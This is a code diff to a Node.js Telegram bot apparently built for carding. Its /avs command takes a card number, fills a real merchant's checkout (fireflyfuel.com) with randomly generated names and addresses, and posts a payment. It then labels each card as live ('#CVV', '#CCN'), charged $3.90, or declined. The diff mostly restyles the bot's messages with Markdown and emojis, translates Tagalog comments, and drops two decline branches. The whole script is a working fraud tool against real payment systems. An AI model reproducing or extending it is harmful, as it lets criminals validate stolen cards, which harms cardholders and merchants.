@@ -48,7 +48,7 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         ano = ano.slice(2);
     }
 
-    bot.sendMessage(chatId, `Tinitingnan ang card: ${lista} ...`);
+    bot.sendMessage(chatId, `🔍 **Checking Card:** \`${lista}\` ...`, { parse_mode: 'Markdown' });
 
     try {
         const jar = new CookieJar();
@@ -110,7 +110,7 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         });
 
         // 4. CHECKOUT INFO POST
-        const infoData = `shipping%5Bcountry%5D=US&shipping%5BUS%5D%5BfirstName%5D=${encodeURIComponent(rfname)}&shipping%5BUS%5D%5BlastName%5D=${encodeURIComponent(rlname)}&shipping%5BUS%5D%5Bcompany%5D=&shipping%5BUS%5D%5Bphone%5D=${rphone}&shipping%5BUS%5D%5Baddress1%5D=${encodeURIComponent(raddrInfo.addr)}&shipping%5BUS%5D%5Baddress2%5D=&shipping%5BUS%5D%5Bcity%5D=${encodeURIComponent(raddrInfo.city)}&shipping%5BUS%5D%5Bstate%5D=${raddrInfo.state}&shipping%5BUS%5D%5Bzipcode%5D=${raddrInfo.zip}&shipping%5BCA%5D%5BfirstName%5D=&shipping%5BCA%5D%5BlastName%5D=&shipping%5BCA%5D%5Bcompany%5D=&shipping%5BCA%5D%5Bphone%5D=&shipping%5BCA%5D%5Baddress1%5D=&shipping%5BCA%5D%5Baddress2%5D=&shipping%5BCA%5D%5Bcity%5D=&shipping%5BCA%5D%5Bstate%5D=ON&shipping%5BCA%5D%5Bzipcode%5D=&shipping%5BGU%5D%5BfirstName%5D=&shipping%5BGU%5D%5BlastName%5D=&shipping%5BGU%5D%5Bcompany%5D=&shipping%5BGU%5D%5Bphone%5D=&shipping%5BGU%5D%5Baddress1%5D=&shipping%5BGU%5D%5Baddress2%5D=&shipping%5BGU%5D%5Bcity%5D=&shipping%5BGU%5D%5Bstate%5D=GU&shipping%5BGU%5D%5Bzipcode%5D=&shipping%5BPR%5D%5BfirstName%5D=&shipping%5BPR%5D%5BlastName%5D=&shipping%5BPR%5D%5Bcompany%5D=&shipping%5BPR%5D%5Bphone%5D=&shipping%5BPR%5D%5Baddress1%5D=&shipping%5BPR%5D%5Baddress2%5D=&shipping%5BPR%5D%5Bcity%5D=&shipping%5BPR%5D%5Bstate%5D=PR&shipping%5BPR%5D%5Bzipcode%5D=&shipping%5BMX%5D%5BfirstName%5D=&shipping%5BMX%5D%5BlastName%5D=&shipping%5BMX%5D%5Bcompany%5D=&shipping%5BMX%5D%5Bphone%5D=&shipping%5BMX%5D%5Baddress1%5D=&shipping%5BMX%5D%5Baddress2%5D=&shipping%5BMX%5D%5Bcity%5D=&shipping%5BMX%5D%5Bstate%5D=AG&shipping%5BMX%5D%5Bzipcode%5D=&shipping%5BAU%5D%5BfirstName%5D=&shipping%5BAU%5D%5BlastName%5D=&shipping%5BAU%5D%5Bcompany%5D=&shipping%5BAU%5D%5Bphone%5D=&shipping%5BAU%5D%5Baddress1%5D=&shipping%5BAU%5D%5Baddress2%5D=&shipping%5BAU%5D%5Bcity%5D=&shipping%5BAU%5D%5Bstate%5D=&shipping%5BAU%5D%5Bzipcode%5D=&shipping%5BNZ%5D%5BfirstName%5D=&shipping%5BNZ%5D%5BlastName%5D=&shipping%5BNZ%5D%5Bcompany%5D=&shipping%5BNZ%5D%5Bphone%5D=&shipping%5BNZ%5D%5Baddress1%5D=&shipping%5BNZ%5D%5Baddress2%5D=&shipping%5BNZ%5D%5Bcity%5D=&shipping%5BNZ%5D%5Bzipcode%5D=&shipping%5BPH%5D%5BfirstName%5D=&shipping%5BPH%5D%5BlastName%5D=&shipping%5BPH%5D%5Bcompany%5D=&shipping%5BPH%5D%5Bphone%5D=&shipping%5BPH%5D%5Baddress1%5D=&shipping%5BPH%5D%5Baddress2%5D=&shipping%5BPH%5D%5Bcity%5D=&shipping%5BPH%5D%5Bzipcode%5D=&shipping%5BPH%5D%5Bstate%5D=&shipping%5BHK%5D%5BfirstName%5D=&shipping%5BHK%5D%5BlastName%5D=&shipping%5BHK%5D%5Bcompany%5D=&shipping%5BHK%5D%5Bphone%5D=&shipping%5BHK%5D%5Baddress2%5D=&shipping%5BHK%5D%5Baddress1%5D=&shipping%5BHK%5D%5Bcity%5D=&billing%5BsameAsShipping%5D=1&billing%5Bcountry%5D=US&billing%5BUS%5D%5BfirstName%5D=&billing%5BUS%5D%5BlastName%5D=&billing%5BUS%5D%5Bcompany%5D=&billing%5BUS%5D%5Bphone%5D=&billing%5BUS%5D%5Baddress1%5D=&billing%5BUS%5D%5Baddress2%5D=&billing%5BUS%5D%5Bcity%5D=&billing%5BUS%5D%5Bstate%5D=${raddrInfo.state}&billing%5BUS%5D%5Bzipcode%5D=&billing%5BCA%5D%5BfirstName%5D=&billing%5BCA%5D%5BlastName%5D=&billing%5BCA%5D%5Bcompany%5D=&billing%5BCA%5D%5Bphone%5D=&billing%5BCA%5D%5Baddress1%5D=&billing%5BCA%5D%5Baddress2%5D=&billing%5BCA%5D%5Bcity%5D=&billing%5BCA%5D%5Bstate%5D=ON&billing%5BCA%5D%5Bzipcode%5D=&billing%5BGU%5D%5BfirstName%5D=&billing%5BGU%5D%5BlastName%5D=&billing%5BGU%5D%5Bcompany%5D=&billing%5BGU%5D%5Bphone%5D=&billing%5BGU%5D%5Baddress1%5D=&billing%5BGU%5D%5Baddress2%5D=&billing%5BGU%5D%5Bcity%5D=&billing%5BGU%5D%5Bstate%5D=GU&billing%5BGU%5D%5Bzipcode%5D=&billing%5BPR%5D%5BfirstName%5D=&billing%5BPR%5D%5BlastName%5D=&billing%5BPR%5D%5Bcompany%5D=&billing%5BPR%5D%5Bphone%5D=&billing%5BPR%5D%5Baddress1%5D=&billing%5BPR%5D%5Baddress2%5D=&billing%5BPR%5D%5Bcity%5D=&billing%5BPR%5D%5Bstate%5D=PR&billing%5BPR%5D%5Bzipcode%5D=&billing%5BMX%5D%5BfirstName%5D=&billing%5BMX%5D%5BlastName%5D=&billing%5BMX%5D%5Bcompany%5D=&billing%5BMX%5D%5Bphone%5D=&billing%5BMX%5D%5Baddress1%5D=&billing%5BMX%5D%5Baddress2%5D=&billing%5BMX%5D%5Bcity%5D=&billing%5BMX%5D%5Bstate%5D=AG&billing%5BMX%5D%5Bzipcode%5D=&billing%5BAU%5D%5BfirstName%5D=&billing%5BAU%5D%5BlastName%5D=&billing%5BAU%5D%5Bcompany%5D=&billing%5BAU%5D%5Bphone%5D=&billing%5BAU%5D%5Baddress1%5D=&billing%5BAU%5D%5Baddress2%5D=&billing%5BAU%5D%5Bcity%5D=&billing%5BAU%5D%5Bstate%5D=&billing%5BAU%5D%5Bzipcode%5D=&billing%5BNZ%5D%5BfirstName%5D=&billing%5BNZ%5D%5BlastName%5D=&billing%5BNZ%5D%5Bcompany%5D=&billing%5BNZ%5D%5Bphone%5D=&billing%5BNZ%5D%5Baddress1%5D=&billing%5BNZ%5D%5Baddress2%5D=&billing%5BNZ%5D%5Bcity%5D=&billing%5BNZ%5D%5Bzipcode%5D=&billing%5BPH%5D%5BfirstName%5D=&billing%5BPH%5D%5BlastName%5D=&billing%5BPH%5D%5Bcompany%5D=&billing%5BPH%5D%5Bphone%5D=&billing%5BPH%5D%5Baddress1%5D=&billing%5BPH%5D%5Baddress2%5D=&billing%5BPH%5D%5Bcity%5D=&billing%5BPH%5D%5Bzipcode%5D=&billing%5BPH%5D%5Bstate%5D=&billing%5BHK%5D%5BfirstName%5D=&billing%5BHK%5D%5BlastName%5D=&billing%5BHK%5D%5Bcompany%5D=&billing%5BHK%5D%5Bphone%5D=&billing%5BHK%5D%5Baddress2%5D=&billing%5BHK%5D%5Baddress1%5D=&billing%5BHK%5D%5Bcity%5D=`;
+        const infoData = `shipping%5Bcountry%5D=US&shipping%5BUS%5D%5BfirstName%5D=${encodeURIComponent(rfname)}&shipping\%5BUS\%5D\%5BlastName\%5D=${encodeURIComponent(rlname)}&shipping%5BUS%5D%5Bcompany%5D=&shipping%5BUS%5D%5Bphone%5D=${rphone}&shipping\%5BUS\%5D\%5Baddress1\%5D=${encodeURIComponent(raddrInfo.addr)}&shipping%5BUS%5D%5Baddress2%5D=&shipping%5BUS%5D%5Bcity%5D=${encodeURIComponent(raddrInfo.city)}&shipping\%5BUS\%5D\%5Bstate\%5D=${raddrInfo.state}&shipping%5BUS%5D%5Bzipcode%5D=${raddrInfo.zip}&shipping\%5BCA\%5D\%5BfirstName\%5D=&shipping\%5BCA\%5D\%5BlastName\%5D=&shipping\%5BCA\%5D\%5Bcompany\%5D=&shipping\%5BCA\%5D\%5Bphone\%5D=&shipping\%5BCA\%5D\%5Baddress1\%5D=&shipping\%5BCA\%5D\%5Baddress2\%5D=&shipping\%5BCA\%5D\%5Bcity\%5D=&shipping\%5BCA\%5D\%5Bstate\%5D=ON&shipping\%5BCA\%5D\%5Bzipcode\%5D=&shipping\%5BGU\%5D\%5BfirstName\%5D=&shipping\%5BGU\%5D\%5BlastName\%5D=&shipping\%5BGU\%5D\%5Bcompany\%5D=&shipping\%5BGU\%5D\%5Bphone\%5D=&shipping\%5BGU\%5D\%5Baddress1\%5D=&shipping\%5BGU\%5D\%5Baddress2\%5D=&shipping\%5BGU\%5D\%5Bcity\%5D=&shipping\%5BGU\%5D\%5Bstate\%5D=GU&shipping\%5BGU\%5D\%5Bzipcode\%5D=&shipping\%5BPR\%5D\%5BfirstName\%5D=&shipping\%5BPR\%5D\%5BlastName\%5D=&shipping\%5BPR\%5D\%5Bcompany\%5D=&shipping\%5BPR\%5D\%5Bphone\%5D=&shipping\%5BPR\%5D\%5Baddress1\%5D=&shipping\%5BPR\%5D\%5Baddress2\%5D=&shipping\%5BPR\%5D\%5Bcity\%5D=&shipping\%5BPR\%5D\%5Bstate\%5D=PR&shipping\%5BPR\%5D\%5Bzipcode\%5D=&shipping\%5BMX\%5D\%5BfirstName\%5D=&shipping\%5BMX\%5D\%5BlastName\%5D=&shipping\%5BMX\%5D\%5Bcompany\%5D=&shipping\%5BMX\%5D\%5Bphone\%5D=&shipping\%5BMX\%5D\%5Baddress1\%5D=&shipping\%5BMX\%5D\%5Baddress2\%5D=&shipping\%5BMX\%5D\%5Bcity\%5D=&shipping\%5BMX\%5D\%5Bstate\%5D=AG&shipping\%5BMX\%5D\%5Bzipcode\%5D=&shipping\%5BAU\%5D\%5BfirstName\%5D=&shipping\%5BAU\%5D\%5BlastName\%5D=&shipping\%5BAU\%5D\%5Bcompany\%5D=&shipping\%5BAU\%5D\%5Bphone\%5D=&shipping\%5BAU\%5D\%5Baddress1\%5D=&shipping\%5BAU\%5D\%5Baddress2\%5D=&shipping\%5BAU\%5D\%5Bcity\%5D=&shipping\%5BAU\%5D\%5Bstate\%5D=&shipping\%5BAU\%5D\%5Bzipcode\%5D=&shipping\%5BNZ\%5D\%5BfirstName\%5D=&shipping\%5BNZ\%5D\%5BlastName\%5D=&shipping\%5BNZ\%5D\%5Bcompany\%5D=&shipping\%5BNZ\%5D\%5Bphone\%5D=&shipping\%5BNZ\%5D\%5Baddress1\%5D=&shipping\%5BNZ\%5D\%5Baddress2\%5D=&shipping\%5BNZ\%5D\%5Bcity\%5D=&shipping\%5BNZ\%5D\%5Bzipcode\%5D=&shipping\%5BPH\%5D\%5BfirstName\%5D=&shipping\%5BPH\%5D\%5BlastName\%5D=&shipping\%5BPH\%5D\%5Bcompany\%5D=&shipping\%5BPH\%5D\%5Bphone\%5D=&shipping\%5BPH\%5D\%5Baddress1\%5D=&shipping\%5BPH\%5D\%5Baddress2\%5D=&shipping\%5BPH\%5D\%5Bcity\%5D=&shipping\%5BPH\%5D\%5Bzipcode\%5D=&shipping\%5BPH\%5D\%5Bstate\%5D=&shipping\%5BHK\%5D\%5BfirstName\%5D=&shipping\%5BHK\%5D\%5BlastName\%5D=&shipping\%5BHK\%5D\%5Bcompany\%5D=&shipping\%5BHK\%5D\%5Bphone\%5D=&shipping\%5BHK\%5D\%5Baddress2\%5D=&shipping\%5BHK\%5D\%5Baddress1\%5D=&shipping\%5BHK\%5D\%5Bcity\%5D=&billing\%5BsameAsShipping\%5D=1&billing\%5Bcountry\%5D=US&billing\%5BUS\%5D\%5BfirstName\%5D=&billing\%5BUS\%5D\%5BlastName\%5D=&billing\%5BUS\%5D\%5Bcompany\%5D=&billing\%5BUS\%5D\%5Bphone\%5D=&billing\%5BUS\%5D\%5Baddress1\%5D=&billing\%5BUS\%5D\%5Baddress2\%5D=&billing\%5BUS\%5D\%5Bcity\%5D=&billing\%5BUS\%5D\%5Bstate\%5D=${raddrInfo.state}&billing%5BUS%5D%5Bzipcode%5D=&billing%5BCA%5D%5BfirstName%5D=&billing%5BCA%5D%5BlastName%5D=&billing%5BCA%5D%5Bcompany%5D=&billing%5BCA%5D%5Bphone%5D=&billing%5BCA%5D%5Baddress1%5D=&billing%5BCA%5D%5Baddress2%5D=&billing%5BCA%5D%5Bcity%5D=&billing%5BCA%5D%5Bstate%5D=ON&billing%5BCA%5D%5Bzipcode%5D=&billing%5BGU%5D%5BfirstName%5D=&billing%5BGU%5D%5BlastName%5D=&billing%5BGU%5D%5Bcompany%5D=&billing%5BGU%5D%5Bphone%5D=&billing%5BGU%5D%5Baddress1%5D=&billing%5BGU%5D%5Baddress2%5D=&billing%5BGU%5D%5Bcity%5D=&billing%5BGU%5D%5Bstate%5D=GU&billing%5BGU%5D%5Bzipcode%5D=&billing%5BPR%5D%5BfirstName%5D=&billing%5BPR%5D%5BlastName%5D=&billing%5BPR%5D%5Bcompany%5D=&billing%5BPR%5D%5Bphone%5D=&billing%5BPR%5D%5Baddress1%5D=&billing%5BPR%5D%5Baddress2%5D=&billing%5BPR%5D%5Bcity%5D=&billing%5BPR%5D%5Bstate%5D=PR&billing%5BPR%5D%5Bzipcode%5D=&billing%5BMX%5D%5BfirstName%5D=&billing%5BMX%5D%5BlastName%5D=&billing%5BMX%5D%5Bcompany%5D=&billing%5BMX%5D%5Bphone%5D=&billing%5BMX%5D%5Baddress1%5D=&billing%5BMX%5D%5Baddress2%5D=&billing%5BMX%5D%5Bcity%5D=&billing%5BMX%5D%5Bstate%5D=AG&billing%5BMX%5D%5Bzipcode%5D=&billing%5BAU%5D%5BfirstName%5D=&billing%5BAU%5D%5BlastName%5D=&billing%5BAU%5D%5Bcompany%5D=&billing%5BAU%5D%5Bphone%5D=&billing%5BAU%5D%5Baddress1%5D=&billing%5BAU%5D%5Baddress2%5D=&billing%5BAU%5D%5Bcity%5D=&billing%5BAU%5D%5Bstate%5D=&billing%5BAU%5D%5Bzipcode%5D=&billing%5BNZ%5D%5BfirstName%5D=&billing%5BNZ%5D%5BlastName%5D=&billing%5BNZ%5D%5Bcompany%5D=&billing%5BNZ%5D%5Bphone%5D=&billing%5BNZ%5D%5Baddress1%5D=&billing%5BNZ%5D%5Baddress2%5D=&billing%5BNZ%5D%5Bcity%5D=&billing%5BNZ%5D%5Bzipcode%5D=&billing%5BPH%5D%5BfirstName%5D=&billing%5BPH%5D%5BlastName%5D=&billing%5BPH%5D%5Bcompany%5D=&billing%5BPH%5D%5Bphone%5D=&billing%5BPH%5D%5Baddress1%5D=&billing%5BPH%5D%5Baddress2%5D=&billing%5BPH%5D%5Bcity%5D=&billing%5BPH%5D%5Bzipcode%5D=&billing%5BPH%5D%5Bstate%5D=&billing%5BHK%5D%5BfirstName%5D=&billing%5BHK%5D%5BlastName%5D=&billing%5BHK%5D%5Bcompany%5D=&billing%5BHK%5D%5Bphone%5D=&billing%5BHK%5D%5Baddress2%5D=&billing%5BHK%5D%5Baddress1%5D=&billing%5BHK%5D%5Bcity%5D=`;
 
         await client.post('https://fireflyfuel.com/checkout/info', infoData, {
             headers: {
@@ -153,41 +153,39 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             }
         });
 
-        // Kunin ang exact response data galing sa AJAX (JSON)
         const ro2 = payRes.data;
         const result = ro2 && ro2.result ? ro2.result : '';
-        // Kunin ang message at tanggalin ang HTML tags tulad ng sa PHP script mo
         let message = ro2 && ro2.messages ? ro2.messages.replace(/<[^>]*>?/gm, '').trim() : (ro2 && ro2.message ? ro2.message : JSON.stringify(ro2));
         const od = ro2 && ro2.order_id ? ro2.order_id : '';
 
         const overallTime = ((Date.now() - startTime) / 1000).toFixed(2);
 
-        let finalResponse = `Card: ${lista}\n`;
+        // Stylish & Clean English Layout
+        let finalResponse = `💳 **Card:** \`${lista}\`\n`;
+        finalResponse += `━━━━━━━━━━━━━━━━━━━━\n`;
 
         if (message.includes('Gateway Error: The address provided does not match the billing address of the cardholder.')) {
-            finalResponse += `STATUS: [#CVV] Address Mismatch\n`;
+            finalResponse += `🟢 **Status:** \`#CVV - Address Mismatch\`\n`;
         } else if (message.includes('Gateway Error: Invalid CVV value') || message.includes('Gateway Error: Insufficient funds')) {
-            finalResponse += `STATUS: [#CCN] ${message}\n`;
+            finalResponse += `🟡 **Status:** \`#CCN\`\n💬 **Reason:** \`${message}\`\n`;
         } else if (result === 'success') {
-            finalResponse += `STATUS: [#CVV CHARGED $3.90]\nOrder Placed ID: ${od}\n`;
-        } else if (message === 'Call Issuer. Pick Up Card.') {
-            finalResponse += `STATUS: [DECLINED] Call Issuer. Pick Up Card.\n`;
-        } else if (message === 'Payment instrument type is not accepted by this merchant account.') {
-            finalResponse += `STATUS: [DECLINED] Payment instrument type not accepted.\n`;
+            finalResponse += `🔥 **Status:** \`#CVV - CHARGED $3.90\`\n📦 **Order ID:** \`${od}\`\n`;
         } else {
-            finalResponse += `STATUS: [DECLINED]\nReason: ${message}\n`;
+            finalResponse += `❌ **Status:** \`DECLINED\`\n💬 **Reason:** \`${message}\`\n`;
         }
 
-        finalResponse += `Time: ${overallTime}s | IP: ${ip}`;
-        bot.sendMessage(chatId, finalResponse);
+        finalResponse += `━━━━━━━━━━━━━━━━━━━━\n`;
+        finalResponse += `⏱ **Time:** \`${overallTime}s\` | 🌐 **IP:** \`${ip}\``;
+
+        bot.sendMessage(chatId, finalResponse, { parse_mode: 'Markdown' });
 
     } catch (error) {
-        bot.sendMessage(chatId, `Error: ${error.message}`);
+        bot.sendMessage(chatId, `❌ **Error:** \`${error.message}\``, { parse_mode: 'Markdown' });
     }
 });
 
 app.get('/', (req, res) => {
-    res.send('PHP-Converted AVS Telegram Bot is running!');
+    res.send('AVS Telegram Bot is running successfully!');
 });
 
 const PORT = process.env.PORT || 3000;
